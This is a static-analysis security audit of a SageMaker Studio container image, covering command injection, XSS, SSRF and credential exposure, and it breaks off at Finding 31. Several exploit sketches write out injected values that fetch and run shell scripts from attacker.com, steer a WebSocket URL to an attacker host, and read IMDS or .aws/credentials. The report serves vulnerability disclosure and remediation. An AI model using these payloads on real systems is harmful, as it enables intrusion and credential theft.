# SageMaker Security Analysis Report

**Target:** Release assets from `sagemaker-snapshot` tag
**Asset:** `sagemaker-source.tar.xz` (~75 MB) — A SageMaker Studio container image snapshot
**Date:** 2026-03-02

---

## Executive Summary

This report documents **50 injection-style vulnerabilities** discovered through static analysis of the SageMaker Studio container image. The codebase includes a Tornado-based inference server, multiple Jupyter server configurations, Amazon Q / AWS Toolkit VS Code extensions, SageMaker Code Editor extensions, Airflow workflow infrastructure, and supporting shell scripts.

The most critical patterns found are:
1. **Command injection** via unsanitized metadata values interpolated into shell commands (multiple scripts)
2. **Stored XSS** via unescaped HTML injection in VS Code extension webviews
3. **Unauthenticated credential exposure** via the SageMaker detached server
4. **SSRF** via jupyter-server-proxy and unvalidated endpoint URLs
5. **Code injection** via dynamic module loading and user-controlled startup scripts

---

## A) Endpoint & Parameter Inventory

| # | METHOD | PATH | Handler File | Query/Body Params | Cookies | Auth Gate |
|---|--------|------|-------------|-------------------|---------|-----------|
| 1 | POST | `/invocations` | etc/sagemaker-inference-server/tornado_server/async_handler.py:35 | raw body | none | none |
| 2 | GET | `/ping` | etc/sagemaker-inference-server/tornado_server/async_handler.py (PingHandler) | none | none | none |
| 3 | GET | `/get_session` | detached-server/server.js | `connection_identifier` | none | none |
| 4 | GET | `/get_session_async` | detached-server/server.js | `connection_identifier` | none | none |
| 5 | GET | `/refresh_token` | detached-server/server.js | `connection_identifier`, `request_id`, `ws_url`, `token`, `session` | none | none |
| 6 | GET/POST | `/jupyterlab/default/proxy/<port>/*` | jupyter-server-proxy (installed extension) | any | `_xsrf` | Jupyter auth |
| 7 | POST | `/jupyterlab/default/api/sagemaker/workflows/*` | Jupyter server extension | JSON body | `_xsrf` | Jupyter auth |
| 8 | GET/POST | `/api/contents/*` | Jupyter Contents API | path params | `_xsrf` | Jupyter auth |
| 9 | * | `http://default:8888/jupyterlab/default/` | Jupyter Notebook server | all | `_xsrf` | token/identity |

## B) Cookie Inventory

| Cookie Name | Where Set | Where Read | Purpose |
|-------------|-----------|------------|---------|
| `_xsrf` | Jupyter server (Tornado) | workflow_client.py:23, all POST handlers | CSRF protection |
| `SagemakerCookie` | SageMaker platform | sagemaker-extension/dist/extension.js | Contains `redirectURL`, session info |
| `jupyter-server-proxy-token` | jupyter-server-proxy | proxy routing | Proxy auth (if configured) |

## C) JWT Verification Audit

No JWT libraries (PyJWT, python-jose, jsonwebtoken, jwt-decode) were found in the application code. Authentication is delegated to the SageMaker platform (`SagemakerIdentityProvider`). The `SagemakerCookie` is parsed as a cookie, not verified as a JWT. **No JWT bypass vulnerabilities apply to this codebase.**

## D) POST→GET Conversion Candidates

| Endpoint | Evidence |
|----------|----------|
| `/invocations` | Only accepts POST; handler explicitly checks `self.request` via `post()` method. No GET equivalent. |
| `/refresh_token` | Already accepts GET with query params. |
| `/get_session` | Already accepts GET with query params. |
| Jupyter Contents API | GET reads files, POST creates; both accept path from URL. |

---

## Findings

---

### [FINDING 1]
**Title:** Command Injection via Unsanitized `dataZoneDomainRegion` in Git Credential Helper
**Severity:** Critical
**Reachable via GET?** No (requires metadata file control, but triggers on every `git fetch/push/pull`)
**Endpoint(s):** N/A (shell script executed at startup)
**Inputs:** `resource-metadata.json` → `AdditionalMetadata.DataZoneDomainRegion`
**Source:** etc/sagemaker-ui/git_config.sh:5-8
```bash
dataZoneDomainRegion=$(jq -r '.AdditionalMetadata.DataZoneDomainRegion' < $sourceMetaData)
git config --global credential.helper "!aws --profile DomainExecutionRoleCreds --region $dataZoneDomainRegion codecommit credential-helper --ignore-host-check $@"
```
**Sink:** etc/sagemaker-ui/git_config.sh:8 — `git config --global credential.helper "!..."` (Git executes `!`-prefixed helpers as shell commands)
**Dataflow summary:**
- `resource-metadata.json` → `jq -r` extraction → `$dataZoneDomainRegion` → embedded in `credential.helper` string → persisted in `.gitconfig` → executed as shell on every git credential request

**Exploit sketch:**
1. Attacker influences `DataZoneDomainRegion` in metadata (e.g., via compromised DataZone API response)
2. Value like `us-east-1$(curl attacker.com/x|sh)` gets embedded in git credential helper
3. Every `git push/pull/fetch` executes the injected command persistently

**Why it's real:** The `!` prefix in git credential.helper causes shell execution. The `$dataZoneDomainRegion` variable is unvalidated and directly interpolated. No regex or format check.
**Fix guidance:**
- Validate region format: `^[a-z]{2}-[a-z]+-\d$` before use
- Quote variables properly in the helper string

---

### [FINDING 2]
**Title:** Command Injection via `credential_process` with Unsanitized Domain ID
**Severity:** Critical
**Reachable via GET?** No (triggers on every AWS SDK credential refresh)
**Endpoint(s):** N/A (shell script executed at startup)
**Inputs:** `resource-metadata.json` → `AdditionalMetadata.DataZoneDomainId`
**Source:** etc/sagemaker-ui/sagemaker_ui_post_startup.sh:49,136
```bash
dataZoneDomainId=$(jq -r '.AdditionalMetadata.DataZoneDomainId' < $sourceMetaData)
...
aws configure set credential_process "sagemaker-studio credentials get-domain-execution-role-credential-in-space --domain-id $dataZoneDomainId --profile default" --profile DomainExecutionRoleCreds
```
**Sink:** AWS config `credential_process` directive — executed as shell command by AWS SDK
**Dataflow summary:**
- `resource-metadata.json` → `jq -r` → `$dataZoneDomainId` → embedded in `credential_process` string → written to `~/.aws/config` → executed by AWS SDK on every credential fetch

**Exploit sketch:**
1. Metadata contains `DataZoneDomainId` with shell metacharacters
2. Value persisted into `~/.aws/config` as `credential_process`
3. Every AWS CLI/SDK call triggers shell execution of the injected payload

**Why it's real:** `credential_process` is a documented AWS feature that runs the configured command in a shell. The domain ID is unvalidated.
**Fix guidance:**
- Validate domain ID format: `^dzd[-_][a-zA-Z0-9_-]{1,36}$` (as `smus-mcp.py` already does)
- Use `--` to separate arguments

---

### [FINDING 3]
**Title:** Command Injection via Unquoted `repoName` in `git clone codecommit` Command
**Severity:** Critical
**Reachable via GET?** No (shell script at startup)
**Inputs:** API response → `dataZoneProjectRepositoryName`
**Source:** etc/sagemaker-ui/git_clone.sh:24
```bash
git clone  codecommit::$AWS_REGION://$repoName $DESTINATION_PATH
```
**Sink:** Shell command execution via unquoted variable expansion
**Dataflow summary:**
- `sagemaker-studio project get-project-default-environment` API response → `jq -r` → `$repoName` → unquoted in `git clone` command

**Exploit sketch:**
1. Repository name from DataZone API contains spaces or shell metacharacters
2. Unquoted `$repoName` causes word splitting and glob expansion
3. Argument injection into `git clone` or shell command execution

**Why it's real:** `$repoName` is unquoted on line 24. Shell word splitting applies.
**Fix guidance:**
- Quote all variables: `git clone "codecommit::${AWS_REGION}://${repoName}" "${DESTINATION_PATH}"`

---

### [FINDING 4]
**Title:** Command Injection via User-Controlled `.libs.json` in `micromamba install`
**Severity:** Critical
**Reachable via GET?** No (triggered at startup, but `.libs.json` is writable by any project collaborator)
**Inputs:** `$SMUS_PROJECT_DIR/.libs.json` → `CondaPackages.Channels`, `CondaPackages.PackageSpecs`
**Source:** etc/sagemaker-ui/libmgmt/install-lib.sh:10-16
```bash
conda_channels=`echo $lib_config_json | jq -r '.Python.CondaPackages.Channels | .[]' | sed 's/^/-c /g'`
conda_package=`echo $lib_config_json | jq -r '.Python.CondaPackages.PackageSpecs | .[]'`
micromamba install --freeze-installed -y $conda_channels $conda_package
```
**Sink:** `micromamba install` with unquoted, user-controlled arguments
**Dataflow summary:**
- Project `.libs.json` file → `jq -r` extraction → unquoted in `micromamba install` command

**Exploit sketch:**
1. Project collaborator edits `.libs.json` with channel: `; curl attacker.com/shell.sh | bash ;`
2. On space restart, `install-lib.sh` runs and executes the injected command

**Why it's real:** `.libs.json` is in the project directory, writable by any collaborator. Values are unquoted.
**Fix guidance:**
- Validate channel/package names against allowlist pattern
- Quote all variables in the command

---

### [FINDING 5]
**Title:** Command Injection via `bash -c` with Metadata-Derived Values in Network Validation
**Severity:** High
**Reachable via GET?** No (startup script)
**Inputs:** `resource-metadata.json` → `ProjectS3Path` → `s3ValidationBucket`; API response → `emr_app_id`
**Source:** etc/sagemaker-ui/network_validation.sh:71,98,132
```bash
SERVICE_COMMANDS["S3"]="aws s3api list-objects --bucket \"$s3ValidationBucket\" --max-items 1"
SERVICE_COMMANDS["EMR Serverless"]="aws emr-serverless get-application --application-id \"$emr_app_id\""
...
timeout "${api_time_out_limit}s" bash -c "${SERVICE_COMMANDS[$service]}"
```
**Sink:** `bash -c` with string containing metadata values
**Dataflow summary:**
- Metadata/API → variable extraction → embedded in command string → executed via `bash -c`

**Exploit sketch:**
1. `s3ValidationBucket` or `emr_app_id` contains shell metacharacters
2. `bash -c` executes the full string including injected commands

**Why it's real:** `bash -c` interprets the entire string as shell commands. Double-quoting inside the string assignment doesn't prevent shell metacharacter interpretation by `bash -c`.
**Fix guidance:**
- Use arrays and `"${cmd[@]}"` execution instead of `bash -c` with strings
- Validate all inputs against expected patterns

---

### [FINDING 6]
**Title:** Persistent `.bashrc` Injection via Unquoted Username Variable
**Severity:** High
**Reachable via GET?** No (startup script)
**Inputs:** DataZone API → `username` (from SSO/IAM identity)
**Source:** etc/sagemaker-ui/sagemaker_ui_post_startup.sh:237-242
```bash
export LOGNAME=$username
...
echo LOGNAME=$username >> ~/.bashrc
echo readonly LOGNAME >> ~/.bashrc
```
**Sink:** Write to `~/.bashrc` (executed on every shell start)
**Dataflow summary:**
- DataZone `get-user-profile` API → `jq -r` → `$username` → unquoted `echo` into `~/.bashrc`

**Exploit sketch:**
1. SSO username contains newlines or shell metacharacters (e.g., `user\nmalicious_command`)
2. Value written to `.bashrc` executes arbitrary code on every new shell session

**Why it's real:** `echo LOGNAME=$username >> ~/.bashrc` without quoting allows injection.
**Fix guidance:**
- Quote: `echo "LOGNAME='$username'" >> ~/.bashrc`
- Validate username against `^[a-zA-Z0-9._@-]+$`

---

### [FINDING 7]
**Title:** Unauthenticated Session Credential Exposure via Detached Server `/get_session`
**Severity:** Critical
**Reachable via GET?** Yes
**Endpoint(s):** GET `/get_session?connection_identifier=<id>`
**Inputs:** query param `connection_identifier`
**Source:** detached-server/server.js (opt/amazon/sagemaker/sagemaker-code-editor-server-data/extensions/amazonwebservices.aws-toolkit-vscode-3.69.0/dist/src/awsService/sagemaker/detached-server/server.js)
```javascript
Pd=v().createServer((e,n)=>{
    switch(dr().parse(e.url||"",!0).pathname){
      case"/get_session":return yP(e,n);
      ...
    }
});
Pd.listen(0,"127.0.0.1",async()=>{...})
```
**Sink:** Returns `SessionId`, `StreamUrl`, `TokenValue` in HTTP response
**Dataflow summary:**
- GET request → `connection_identifier` query param → credentials lookup → SageMaker StartSession API → session tokens returned in plain JSON

**Exploit sketch:**
1. Discover server port from `SAGEMAKER_LOCAL_SERVER_FILE_PATH`
2. `GET http://127.0.0.1:<port>/get_session?connection_identifier=<valid_id>`
3. Receive SageMaker session credentials (SessionId, StreamUrl, TokenValue)

**Why it's real:** No authentication on the HTTP server. Any local process can call this endpoint.
**Fix guidance:**
- Add authentication token/shared secret
- Restrict to specific callers via socket permissions

---

### [FINDING 8]
**Title:** Token/URL Injection via Unauthenticated `/refresh_token` Endpoint
**Severity:** Critical
**Reachable via GET?** Yes
**Endpoint(s):** GET `/refresh_token?connection_identifier=X&request_id=X&ws_url=X&token=X&session=X`
**Inputs:** query params: `connection_identifier`, `request_id`, `ws_url`, `token`, `session`
**Source:** detached-server/server.js
```javascript
async function fP(e,n){
    const t=dr().parse(e.url||"",!0),
    r=t.query.connection_identifier,
    s=t.query.request_id,
    o=t.query.ws_url,
    u=t.query.token,
    p=t.query.session;
    ...
    await g.setSession(r,s,{sessionId:p,token:u,url:o})
}
```
**Sink:** Stores attacker-provided `ws_url`, `token`, `session` in credential mapping file
**Dataflow summary:**
- GET request → query params → `setSession()` → written to `~/.aws/.sagemaker-space-profiles`

**Exploit sketch:**
1. `GET http://127.0.0.1:<port>/refresh_token?connection_identifier=X&ws_url=wss://attacker.com&token=fake&session=fake`
2. Next session connection uses attacker-controlled WebSocket URL → credential interception

**Why it's real:** No authentication, no validation of ws_url/token values.
**Fix guidance:**
- Add authentication
- Validate ws_url against AWS domain allowlist

---

### [FINDING 9]
**Title:** SSRF via `jupyter-server-proxy` — Proxy to Arbitrary Localhost Ports
**Severity:** High
**Reachable via GET?** Yes
**Endpoint(s):** GET `/jupyterlab/default/proxy/<port>/<path>`
**Inputs:** `<port>` and `<path>` from URL
**Source:** opt/conda/etc/jupyter/jupyter_server_config.d/jupyter-server-proxy.json
```json
{"ServerApp":{"jpserver_extensions":{"jupyter_server_proxy": true}}}
```
**Sink:** HTTP proxy to `localhost:<port>/<path>`
**Dataflow summary:**
- Authenticated user request → Jupyter proxy → forwards to `localhost:<port>` → response returned

**Exploit sketch:**
1. Access `GET /jupyterlab/default/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/`
2. IMDS v1 credentials returned (if reachable from the container)
3. Or proxy to internal services: `proxy/5432/` (PostgreSQL), `proxy/8080/` (Airflow)

**Why it's real:** `jupyter-server-proxy` v4.4.0 is enabled. Already used to proxy Airflow on port 8080.
**Fix guidance:**
- Configure `jupyter_server_proxy` with allowlist of permitted ports
- Block IMDS IP range (169.254.169.254)

---

### [FINDING 10]
**Title:** Hardcoded PostgreSQL Credentials in Airflow Container
**Severity:** High
**Reachable via GET?** Yes (via jupyter-server-proxy on port 5432)
**Endpoint(s):** PostgreSQL on port 5432 (network_mode: sagemaker)
**Inputs:** Connection with `airflow`/`airflow` credentials
**Source:** etc/sagemaker-ui/workflows/docker-compose.yaml:57-60
```yaml
environment:
    POSTGRES_USER: airflow
    POSTGRES_PASSWORD: airflow
    POSTGRES_DB: airflow
```
**Sink:** PostgreSQL database with DAG metadata, connection info, variable storage
**Dataflow summary:**
- jupyter-server-proxy → port 5432 → PostgreSQL → airflow/airflow credentials → database access

**Exploit sketch:**
1. Use `jupyter-server-proxy` or notebook code to connect to `localhost:5432`
2. Authenticate with `airflow`/`airflow`
3. Read/modify Airflow connections (which may contain other service credentials), DAG runs, variables

**Why it's real:** Credentials hardcoded in YAML, database on same network as notebook kernel.
**Fix guidance:**
- Generate random password at startup
- Restrict database access to Airflow containers only

---

### [FINDING 11]
**Title:** Stored XSS via Unescaped Reference Metadata in CodeWhisperer ReferenceLog
**Severity:** High
**Reachable via GET?** Yes (triggered by viewing code suggestions with references)
**Endpoint(s):** VS Code webview — ReferenceLog panel
**Inputs:** CodeWhisperer suggestion reference metadata (`licenseName`, `repository`, `url`)
**Source:** dist/src/extensionNode.js (~line 2567)
```javascript
let Ce = `<a href=${r.LicenseUtil.getLicenseHtml(Se.licenseName)}>${Se.licenseName}</a>`
let Ee = Se.repository?.length ? Se.repository : "unknown";
Se.url?.length && (Ee = `<a href=${Se.url}>${Se.repository}</a>`,
    Ce = `<b><i>${Se.licenseName || "unknown"}</i></b>`)
```
**Sink:** `this._referenceLogs.push(L)` → `${this._referenceLogs.join("")}` in webview HTML
**Dataflow summary:**
- CodeWhisperer API response → `Se.licenseName`/`Se.url`/`Se.repository` → HTML string construction (no escaping, unquoted attributes) → `innerHTML` via template literal in webview body

**Exploit sketch:**
1. Malicious code suggestion includes reference with `url: "x onclick=alert(document.cookie)"`
2. Unquoted `<a href=${Se.url}>` becomes `<a href=x onclick=alert(document.cookie)>`
3. User clicks the ReferenceLog → XSS executes with access to `acquireVsCodeApi()`

**Why it's real:** `href` attributes are unquoted. Values are not HTML-escaped. `innerHTML` is used.
**Fix guidance:**
- HTML-encode all interpolated values
- Quote all attribute values: `href="${escaped(url)}"`

---

### [FINDING 12]
**Title:** Command Injection via Unvalidated `clusterId` in Generated Notebook Cells
**Severity:** High
**Reachable via GET?** No (requires workspace settings control)
**Endpoint(s):** VS Code extension — open notebook
**Inputs:** VS Code setting `extensions.openNotebookData.clusterId`
**Source:** sagemaker-open-notebook-extension/dist/extension.js
```javascript
e.source=["%%bash\n",
    `aws ssm start-session --target sagemaker-cluster:${t} --region ${o}`]
e.source=[`!hyperpod connect-cluster --cluster-name ${t}`]
```
**Sink:** Notebook cell content executed by kernel
**Dataflow summary:**
- `.vscode/settings.json` → `clusterId` → interpolated into shell commands in notebook cells → executed by user

**Exploit sketch:**
1. Attacker includes `.vscode/settings.json` in a cloned repo with `clusterId: "foo; curl attacker.com/x|sh #"`
2. User opens notebook → cells contain injected commands
3. User executes notebook cells → arbitrary command execution

**Why it's real:** `region` is validated with regex but `clusterId` has no validation at all.
**Fix guidance:**
- Validate `clusterId` against `^[a-zA-Z0-9_-]+$`

---

### [FINDING 13]
**Title:** `exec()` with String Interpolation in Kill Command (Command Injection)
**Severity:** High
**Reachable via GET?** No (triggered by terminal events)
**Inputs:** Output of `ps -eo pid,comm | grep bash`
**Source:** sagemaker-terminal-crash-mitigation/dist/extension.js
```javascript
(0,c.exec)("ps -eo pid,comm | grep bash | awk '{print $1}'",(e,o,r)=>{
    const t=o.trim().split("\n").filter((e=>e));
    t.forEach((e=>{
        (0,c.exec)(`kill -9 ${e}`,...)
    }))
})
```
**Sink:** `child_process.exec(`kill -9 ${e}`)` — shell-based execution
**Dataflow summary:**
- `ps` output → split by newline → each line interpolated into `exec()` string

**Exploit sketch:**
1. Process with name containing `bash` and shell metacharacters in PID field (unlikely with standard ps, but the pattern is dangerous)

**Why it's real:** Uses `exec()` (shell) instead of `execFile()` (no shell). String interpolation into shell command.
**Fix guidance:**
- Use `execFile('kill', ['-9', pid])` instead of `exec(`kill -9 ${e}`)`

---

### [FINDING 14]
**Title:** SSRF via Unvalidated `DataZoneEndpoint` in AWS API Calls
**Severity:** High
**Reachable via GET?** No (startup scripts, but credentials sent to arbitrary endpoint)
**Inputs:** `resource-metadata.json` → `AdditionalMetadata.DataZoneEndpoint`
**Source:** etc/sagemaker-ui/sagemaker_ui_post_startup.sh:92
```bash
domain_response=$(aws datazone get-domain --debug --endpoint-url "$dataZoneEndPoint" ...)
```
Also: etc/sagemaker-ui/workflows/workflow_client.py:53-54
```python
DZ_CLIENT = boto3.client("datazone", endpoint_url=endpoint)
```
**Sink:** AWS SDK `endpoint_url` — SigV4 credentials sent to the specified URL
**Dataflow summary:**
- `resource-metadata.json` → `$dataZoneEndPoint` → `--endpoint-url` / `endpoint_url=` → AWS SDK sends SigV4 signed requests to attacker server

**Exploit sketch:**
1. Attacker controls `DataZoneEndpoint` value in metadata
2. All DataZone API calls (with SigV4 signatures) redirected to attacker's server
3. Attacker captures IAM credentials from SigV4 headers

**Why it's real:** No URL validation (no scheme check, no domain allowlist).
**Fix guidance:**
- Validate endpoint URL against `^https://[a-z0-9.-]+\.amazonaws\.com(/.*)?$`

---

### [FINDING 15]
**Title:** Arbitrary Code Execution via Dynamic Module Loading in Inference Server
**Severity:** Critical
**Reachable via GET?** No (requires env var or model artifact control)
**Endpoint(s):** POST `/invocations` (handler loaded at startup)
**Inputs:** `SAGEMAKER_INFERENCE_CODE`, `SAGEMAKER_INFERENCE_CODE_DIRECTORY` env vars
**Source:** etc/sagemaker-inference-server/tornado_server/server.py:98-111
```python
inference_module_name, handle_name = self._environment.code.split(".")
inference_module_file = f"{inference_module_name}.py"
module_spec = importlib.util.spec_from_file_location(
    inference_module_file, str(self._path_to_inference_code.joinpath(inference_module_file)))
module = importlib.util.module_from_spec(module_spec)
module_spec.loader.exec_module(module)
```
**Sink:** `exec_module()` — executes all top-level Python code in the loaded file
**Dataflow summary:**
- Env var → module name → `Path.joinpath()` (path traversal possible) → `exec_module()` → arbitrary code execution

**Why it's real:** `Path.joinpath()` doesn't prevent `../../` traversal. No validation of module path.
**Fix guidance:**
- Validate that resolved path is under allowed base directory
- Use `Path.resolve()` and check it starts with expected prefix

---

### [FINDING 16]
**Title:** Path Traversal in Inference Server Code Directory
**Severity:** High
**Reachable via GET?** No (requires env var control)
**Inputs:** `SAGEMAKER_INFERENCE_CODE_DIRECTORY` env var
**Source:** etc/sagemaker-inference-server/tornado_server/server.py:41-45
```python
self._path_to_inference_code = (
    Path(self._environment.base_directory).joinpath(self._environment.code_directory)
    if self._environment.code_directory
    else Path(self._environment.base_directory)
)
```
**Sink:** Module loading (Finding 15) and requirements installation (Finding 17)
**Dataflow summary:**
- `SAGEMAKER_INFERENCE_CODE_DIRECTORY` → `Path.joinpath()` → no canonicalization → path traversal to `/opt/ml/model/../../<anywhere>`

**Why it's real:** `Path.joinpath()` with `../../` allows escaping base directory.
**Fix guidance:**
- `resolved = path.resolve(); assert str(resolved).startswith(str(base))`

---

### [FINDING 17]
**Title:** Arbitrary Package Installation via Traversed `requirements.txt`
**Severity:** High
**Reachable via GET?** No (startup)
**Inputs:** `requirements.txt` at path-traversed location
**Source:** etc/sagemaker-inference-server/tornado_server/server.py:83-92
```python
requirements_txt = self._path_to_inference_code.joinpath(self._environment.requirements)
subprocess.check_call(["micromamba", "install", "--yes", "--file", str(requirements_txt)])
# fallback:
subprocess.check_call(["pip", "install", "-r", str(requirements_txt)])
```
**Sink:** `pip install -r` / `micromamba install` — installs packages from attacker-controlled file
**Dataflow summary:**
- Path traversal (Finding 16) → `requirements.txt` at arbitrary location → package installation → malicious setup.py execution

**Why it's real:** Combined with Finding 16, can install packages from anywhere on filesystem.
**Fix guidance:**
- Validate path before use (same as Finding 16)

---

### [FINDING 18]
**Title:** User-Controlled `startup.sh` Concatenated into Airflow Container Startup
**Severity:** High
**Reachable via GET?** No (project file)
**Inputs:** `$PROJECT_DIR/workflows/config/startup.sh`
**Source:** etc/sagemaker-ui/workflows/start-workflows-container.sh:146-147
```bash
if [ -f $USER_STARTUP_FILE ]; then
    tail -n +2 $USER_STARTUP_FILE >> "${WORKFLOW_STARTUP_PATH}startup.sh"
```
**Sink:** Appended to system startup script → executed in Airflow container
**Dataflow summary:**
- User-editable file → `tail -n +2` → appended to startup script → runs in Docker container with AWS credentials

**Why it's real:** Any project collaborator can write `workflows/config/startup.sh`. Content runs with container privileges.
**Fix guidance:**
- Document the security implications
- Run with minimal privileges

---

### [FINDING 19]
**Title:** User-Controlled `requirements.txt` Installed in Airflow Container
**Severity:** High
**Reachable via GET?** No (project file)
**Inputs:** `$PROJECT_DIR/workflows/config/requirements.txt`
**Source:** etc/sagemaker-ui/workflows/start-workflows-container.sh:157-159
```bash
if [ -f $USER_REQUIREMENTS_FILE ]; then
    cat $USER_REQUIREMENTS_FILE >> "${WORKFLOW_REQUIREMENTS_PATH}requirements.txt"
```
**Sink:** `pip install -r` in container → malicious `setup.py` execution
**Dataflow summary:**
- User-editable file → cat → appended to system requirements → installed in container

**Why it's real:** Same as Finding 18 — project collaborators can inject malicious packages.
**Fix guidance:**
- Validate package names against PyPI
- Use `--no-build-isolation` restrictions

---

### [FINDING 20]
**Title:** XSS via Unsanitized Handler Response on `/invocations`
**Severity:** Medium
**Reachable via GET?** No (POST only)
**Endpoint(s):** POST `/invocations`
**Inputs:** HTTP request body
**Source:** etc/sagemaker-inference-server/tornado_server/async_handler.py:35-42
```python
response = await self._handler(self.request)
self.write(response)
```
**Sink:** `self.write(response)` — Tornado defaults to `text/html` Content-Type
**Dataflow summary:**
- POST body → user handler → response → `self.write()` → HTTP response without Content-Type enforcement

**Exploit sketch:**
1. If handler reflects input: `POST /invocations` with `<script>alert(1)</script>`
2. Response rendered as HTML by browser

**Why it's real:** No explicit Content-Type set. Tornado defaults may render as HTML.
**Fix guidance:**
- Set `Content-Type: application/json` or `application/octet-stream` explicitly

---

### [FINDING 21]
**Title:** No XSRF/CSRF Protection on Inference Server
**Severity:** Medium
**Reachable via GET?** N/A (CSRF on POST)
**Endpoint(s):** POST `/invocations`
**Source:** etc/sagemaker-inference-server/tornado_server/async_handler.py:68-73
```python
app = tornado.web.Application([
    (r"/invocations", InvocationsHandler, dict(handler=handler, environment=environment)),
    (r"/ping", PingHandler),
])
```
**Sink:** Tornado Application without `xsrf_cookies=True`
**Why it's real:** No `cookie_secret` or `xsrf_cookies` configured. Cross-site POST forgery possible.
**Fix guidance:**
- Add `xsrf_cookies=True` and `cookie_secret` to Tornado Application

---

### [FINDING 22]
**Title:** CSP Header from Unvalidated Environment Variable
**Severity:** Medium
**Reachable via GET?** Yes (affects all Jupyter responses)
**Endpoint(s):** All Jupyter endpoints
**Inputs:** `JUPYTERSERVER_CSP_RULE` env var
**Source:** etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:11-13
```python
csp_rule = os.environ.get("JUPYTERSERVER_CSP_RULE")
c.ServerApp.tornado_settings = {"compress_response": True, "headers": {"Content-Security-Policy": csp_rule}}
```
**Sink:** HTTP `Content-Security-Policy` header
**Dataflow summary:**
- Env var → `os.environ.get()` → CSP header (if unset, `None`; if empty, no protection)

**Why it's real:** If env var is unset or empty, CSP is effectively disabled.
**Fix guidance:**
- Set a secure default CSP value as fallback

---

### [FINDING 23]
**Title:** Hidden Files (Including `.aws/credentials`) Accessible via Jupyter API
**Severity:** Medium
**Reachable via GET?** Yes
**Endpoint(s):** GET `/api/contents/.aws/credentials`
**Source:** etc/jupyter/jupyter_server_config.py:16
```python
c.ContentsManager.allow_hidden = True
```
**Sink:** Jupyter Contents API serves hidden files
**Dataflow summary:**
- `allow_hidden = True` → API serves `.aws/`, `.ssh/`, `.env`, `.bash_history`

**Exploit sketch:**
1. `GET /api/contents/.aws/credentials` → returns AWS credential file content
2. `GET /api/contents/.bash_history` → returns command history

**Why it's real:** Explicitly configured to serve dotfiles. Combined with root execution.
**Fix guidance:**
- Add contents_manager deny patterns for sensitive directories

---

### [FINDING 24]
**Title:** Permanent Directory Deletion Without Confirmation via Jupyter API
**Severity:** Medium
**Reachable via GET?** No (DELETE method)
**Endpoint(s):** DELETE `/api/contents/<path>`
**Source:** etc/jupyter/jupyter_server_config.py:8,12
```python
c.FileContentsManager.delete_to_trash = False
c.FileContentsManager.always_delete_dir = True
```
**Sink:** Permanent deletion of any directory tree
**Dataflow summary:**
- DELETE API call → `always_delete_dir=True` → bypasses non-empty check → `delete_to_trash=False` → permanent deletion

**Why it's real:** Running as root + permanent deletion = can destroy any directory.
**Fix guidance:**
- Restrict `always_delete_dir` to user home directory paths

---

### [FINDING 25]
**Title:** Dynamic `__import__` with Bare Exception in Jupyter Config (Module Hijacking)
**Severity:** Medium
**Reachable via GET?** No (server startup)
**Source:** etc/jupyter/jupyter_server_config.py:24
```python
module = __import__("amazon_sagemaker_sql_editor")
module_location = os.path.dirname(module.__file__)
c.LanguageServerManager.extra_node_roots = [f"{module_location}/sql-language-server"]
```
**Sink:** `__import__()` — loads module from first matching path on `sys.path`
**Dataflow summary:**
- `sys.path` (includes CWD) → `__import__("amazon_sagemaker_sql_editor")` → executes module's `__init__.py`

**Exploit sketch:**
1. User creates `amazon_sagemaker_sql_editor.py` in their working directory
2. On Jupyter server restart, the malicious module is imported instead of the real one

**Why it's real:** Python imports from CWD first. Bare `except: pass` hides any errors.
**Fix guidance:**
- Use absolute import or validate module source
- Replace bare `except` with `except ImportError`

---

### [FINDING 26]
**Title:** XSRF Bypass in Workflow Client (Self-Fetched Token)
**Severity:** Medium
**Reachable via GET?** No (local client)
**Endpoint(s):** POST to Jupyter workflow API endpoints
**Source:** etc/sagemaker-ui/workflows/workflow_client.py:126-128
```python
session = requests.Session()
session.get(JUPYTERLAB_URL)  # populates _xsrf cookie
```
**Sink:** XSRF token used for POST requests to Jupyter server
**Dataflow summary:**
- `GET http://default:8888/jupyterlab/default/` → receives `_xsrf` cookie → uses it for authenticated POST requests

**Why it's real:** Any local process can replicate this pattern and perform workflow management actions.
**Fix guidance:**
- Add additional authentication beyond XSRF for workflow management endpoints

---

### [FINDING 27]
**Title:** Credential Logging in Detached Server
**Severity:** Medium
**Reachable via GET?** N/A (log access)
**Source:** detached-server/server.js (function `Tt`)
```javascript
console.log(`Mapping file path: ${Dr}`);
console.log(`Conents: ${e}`);  // logs full credential file
```
**Sink:** `console.log` with session tokens, WebSocket URLs, and credential data
**Why it's real:** Full credential file contents logged on every API call.
**Fix guidance:**
- Remove credential logging or redact sensitive fields

---

### [FINDING 28]
**Title:** URL Reflection in Detached Server 404 Response
**Severity:** Medium
**Reachable via GET?** Yes
**Endpoint(s):** Any unmatched path on detached server
**Source:** detached-server/server.js
```javascript
default:n.writeHead(404,{"Content-Type":"text/plain"}),n.end(`Not Found: ${e.url}`)
```
**Sink:** HTTP response body with unsanitized URL
**Dataflow summary:**
- Request URL → reflected in 404 response body

**Why it's real:** Raw URL reflected without escaping. CRLF injection possible in some HTTP parsers.
**Fix guidance:**
- Sanitize or omit the URL from error responses

---

### [FINDING 29]
**Title:** SAGEMAKER_ENDPOINT Override Enables SSRF on SageMaker API Calls
**Severity:** Medium
**Reachable via GET?** No (env var)
**Source:** detached-server/server.js (function `WO`)
```javascript
const r=process.env.SAGEMAKER_ENDPOINT||`https://sagemaker.${e}.amazonaws.com`
```
**Sink:** AWS SDK `endpoint` parameter — redirects API calls with credentials
**Why it's real:** Environment variable overrides API endpoint without validation.
**Fix guidance:**
- Validate against AWS domain pattern

---

### [FINDING 30]
**Title:** Open Redirect via Unvalidated Cookie `redirectURL` in SageMaker Extension
**Severity:** Medium
**Reachable via GET?** No (cookie-triggered)
**Inputs:** `SagemakerCookie` → `redirectURL`
**Source:** sagemaker-extension/dist/extension.js (function `f` and `A`)
```javascript
function f(e){return c||e.redirectURL}
function A(e){
    const t=f(e);
    E.SessionWarning.signInWarning(e).then((e=>{
        e===S.SIGN_IN_BUTTON&&s.env.openExternal(s.Uri.parse(t))
    }))
}
```
**Sink:** `vscode.env.openExternal(Uri.parse(t))` — opens URL in browser
**Dataflow summary:**
- Cookie value → `redirectURL` → `Uri.parse()` → opens in external browser

**Exploit sketch:**
1. Set `SagemakerCookie` with `redirectURL` pointing to phishing page
2. User sees "Sign In" warning → clicks → redirected to attacker's page

**Why it's real:** No URL validation before `openExternal()`.
**Fix guidance:**
- Validate URL against AWS domain allowlist

---

### [FINDING 31]
**Title:** postMessage Handlers Without Origin Validation (Multiple Webviews)
